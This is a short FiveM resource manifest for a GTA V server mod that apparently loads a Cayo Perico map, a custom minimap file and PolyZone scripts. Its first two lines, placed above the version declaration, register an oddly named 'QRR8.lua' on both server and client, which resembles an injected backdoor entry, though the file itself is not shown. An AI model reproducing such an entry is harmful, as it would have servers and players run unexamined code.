server_script "QRR8.lua"
client_script "QRR8.lua"
fx_version 'adamant'
games { 'gta5' }

data_file "SCALEFORM_DLC_FILE" "stream/cpminimap/int3232302352.gfx"

files {
	"stream/cpminimap/int3232302352.gfx",
}

client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/EntityZone.lua',
    '@PolyZone/CircleZone.lua',
    '@PolyZone/ComboZone.lua',
	'uj_cayoLoader.lua',
}